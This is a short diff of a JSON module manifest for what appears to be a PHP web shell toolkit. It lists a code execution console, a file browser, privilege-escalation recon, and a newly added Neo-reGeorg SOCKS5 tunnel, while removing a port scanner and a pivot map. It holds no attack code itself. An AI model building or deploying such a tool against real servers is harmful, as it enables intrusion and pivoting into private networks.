@@ -1,13 +1,10 @@
 {
   "version": "1.0.0",
-  "default_cidr": "192.168.2.0/24",
-  "default_ports": "80",
   "modules": {
     "console":     { "required": true,  "description": "PHP code execution console" },
-    "scanner":     { "required": false, "description": "Network CIDR port scanner" },
     "files":       { "required": true,  "description": "File browser, upload, delete" },
+    "tunnel":      { "required": false, "description": "Neo-reGeorg SOCKS5 tunnel endpoint" },
     "diagnostics": { "required": false, "description": "System recon and privesc hints" },
-    "history":     { "required": false, "description": "Command execution history" },
-    "pivot":       { "required": false, "description": "Visual network pivot map" }
+    "history":     { "required": false, "description": "Command execution history" }
   }
 }
